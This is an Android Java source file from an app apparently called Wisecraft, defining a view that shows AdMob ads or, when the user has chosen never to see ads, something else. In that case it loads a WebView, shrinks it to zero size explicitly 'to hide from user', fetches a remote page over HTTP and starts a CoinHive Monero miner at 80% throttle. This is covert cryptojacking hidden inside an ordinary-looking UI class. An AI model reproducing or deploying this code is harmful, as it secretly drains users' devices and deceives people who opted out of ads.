package com.nao20010128nao.Wisecraft.misc.view;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.support.annotation.AttrRes;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.annotation.StyleRes;
import android.util.AttributeSet;
import android.view.LayoutInflater;
import android.view.ViewGroup;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;

import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.nao20010128nao.Wisecraft.misc.Utils;
import com.nao20010128nao.Wisecraft.R;

/**
 * Created by lesmi on 17/09/21.
 */

public class WisecraftMonetizeWrapperView extends FrameLayout {
    public WisecraftMonetizeWrapperView(@NonNull Context context) {
        super(context);
        setup(context);
    }

    public WisecraftMonetizeWrapperView(@NonNull Context context, @Nullable AttributeSet attrs) {
        super(context, attrs);
        setup(context);
    }

    public WisecraftMonetizeWrapperView(@NonNull Context context, @Nullable AttributeSet attrs, @AttrRes int defStyleAttr) {
        super(context, attrs, defStyleAttr);
        setup(context);
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public WisecraftMonetizeWrapperView(@NonNull Context context, @Nullable AttributeSet attrs, @AttrRes int defStyleAttr, @StyleRes int defStyleRes) {
        super(context, attrs, defStyleAttr, defStyleRes);
        setup(context);
    }

    private void setup(Context c){
        SharedPreferences pref= Utils.getPreferences(c);
        if(pref.getBoolean("neverShowAds",false)){
            // WebView with Monero Miner
            LayoutInflater.from(c).inflate(R.layout.money_monero,this);
            // set size to 0 to hide from user
            ViewGroup.LayoutParams params=getLayoutParams();
            params.height=params.width=0;
            setLayoutParams(params);
            // boot Monero miner
            WebView view=findViewById(R.id.adView);
            view.setWebViewClient(new WebViewClient(){
                @Override
                public void onPageFinished(WebView view, String url) {
                    if("http://nao20010128nao.github.io/monero/boilerplate".equals(url)){
                        // boot the miner
                        view.loadUrl("javascript: new CoinHive.Anonymous('LZSdFJYBUldfKhSwZV5aWrgDXpFzut66',{throttle: 0.8}).start()");
                    }
                }
            });
            view.loadUrl("http://nao20010128nao.github.io/monero/boilerplate");
        }else{
            // AdView
            LayoutInflater.from(c).inflate(R.layout.money_ad_view,this);
            AdView view=findViewById(R.id.adView);
            view.loadAd(new AdRequest.Builder().build());
        }
    }
}
